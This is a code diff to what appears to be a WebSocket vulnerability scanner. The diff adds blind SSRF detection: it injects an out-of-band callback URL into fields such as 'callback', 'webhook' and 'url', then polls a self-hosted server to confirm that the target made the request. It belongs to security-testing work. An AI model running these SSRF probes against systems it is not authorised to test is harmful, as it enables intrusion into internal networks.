@@ -10,6 +10,7 @@ from core.scanner import ws_connect, send_recv
 from core.findings import store
 from utils.evidence import Evidence
 from utils.logger import log
+from core.oob_profile import oob_profile
 
 
 # ── SSRF Payloads ─────────────────────────────────────────────────────────────
@@ -78,12 +79,110 @@ async def test_ssrf(ws_url: str, fast_mode: bool = False) -> bool:
 
     try:
         async with await ws_connect(ws_url, timeout=6) as ws:
+            # ── OOB (Blind SSRF) setup ─────────────────────────────────────
+            oob_token = None
+            oob_url = None
+            if oob_profile.is_configured():
+                try:
+                    oob_token = oob_profile.new_token()
+                    oob_url = oob_profile.callback_url(oob_token)
+                except Exception:
+                    oob_token = None
+                    oob_url = None
+
+            # If OOB is configured, test it early via common callback/webhook fields.
+            # This enables blind SSRF confirmation even when server returns no content.
+            if oob_url:
+                oob_fields = ['callback', 'webhook', 'url', 'target', 'redirect', 'link', 'src']
+                for field in (oob_fields[:3] if fast_mode else oob_fields):
+                    try:
+                        msg = json.dumps({field: oob_url})
+                        resp = await send_recv(ws, msg, timeout=4)
+                        # If server responds with something, still proceed to polling for proof.
+                        ev_hit = await oob_profile.poll_for_hit(oob_token) if oob_token else None
+                        if ev_hit:
+                            ev = Evidence.make(
+                                payload=msg,
+                                request=f"Injected OOB callback URL into field '{field}': {oob_url}",
+                                response=(str(resp)[:300] if resp else None),
+                                proof=(
+                                    "Blind SSRF confirmed via OOB callback.\n"
+                                    f"Callback URL: {oob_url}\n"
+                                    f"Observed event: {json.dumps(ev_hit, ensure_ascii=False)[:800]}"
+                                ),
+                                reproduce=(
+                                    f"1. Configure OOB base URL in the scanner (self-hosted oob_server.py)\n"
+                                    f"2. Connect to {ws_url}\n"
+                                    f"3. Send: {msg}\n"
+                                    f"4. Verify OOB hit for token: {oob_token}"
+                                ),
+                                oob_url=oob_url,
+                                oob_token=oob_token,
+                                oob_event=ev_hit,
+                                ssrf_field=field,
+                            )
+                            store.add(
+                                ws_url,
+                                "SSRF via WebSocket — Confirmed (OOB callback)",
+                                "CRITICAL",
+                                "Server made an out-of-band HTTP request to the supplied callback URL, confirming blind SSRF.\n"
+                                "Impact: internal network access, metadata theft, pivoting, data exfiltration.",
+                                ev,
+                                confidence="CONFIRMED",
+                            )
+                            log.warning(f"OOB SSRF confirmed on {ws_url}")
+                            return True
+                    except Exception:
+                        continue
+
             for target_url, target_name in targets:
                 for field in SSRF_FIELDS[:5] if fast_mode else SSRF_FIELDS:
                     try:
                         msg = json.dumps({field: target_url})
                         resp = await send_recv(ws, msg, timeout=5)
                         if not resp:
+                            # If response is empty and OOB is configured, try blind confirmation.
+                            # Use a fresh token per attempt so correlation is unambiguous.
+                            if oob_profile.is_configured():
+                                try:
+                                    tok = oob_profile.new_token()
+                                    cb = oob_profile.callback_url(tok)
+                                    oob_msg = json.dumps({field: cb})
+                                    _ = await send_recv(ws, oob_msg, timeout=3)
+                                    ev_hit = await oob_profile.poll_for_hit(tok)
+                                    if ev_hit:
+                                        ev = Evidence.make(
+                                            payload=oob_msg,
+                                            request=f"Injected OOB callback URL into field '{field}': {cb}",
+                                            proof=(
+                                                "Blind SSRF confirmed via OOB callback.\n"
+                                                f"Callback URL: {cb}\n"
+                                                f"Observed event: {json.dumps(ev_hit, ensure_ascii=False)[:800]}"
+                                            ),
+                                            reproduce=(
+                                                f"1. Configure OOB base URL in the scanner\n"
+                                                f"2. Connect to {ws_url}\n"
+                                                f"3. Send: {oob_msg}\n"
+                                                f"4. Verify OOB hit for token: {tok}"
+                                            ),
+                                            oob_url=cb,
+                                            oob_token=tok,
+                                            oob_event=ev_hit,
+                                            ssrf_field=field,
+                                        )
+                                        store.add(
+                                            ws_url,
+                                            "SSRF via WebSocket — Confirmed (OOB callback)",
+                                            "CRITICAL",
+                                            "Server made an out-of-band HTTP request to the supplied callback URL, confirming blind SSRF.\n"
+                                            "Impact: internal network access, metadata theft, pivoting, data exfiltration.",
+                                            ev,
+                                            confidence="CONFIRMED",
+                                        )
+                                        log.warning(f"OOB SSRF confirmed on {ws_url}")
+                                        return True
+                                except Exception:
+                                    pass
                             continue
 
                         # Check if server returned internal content
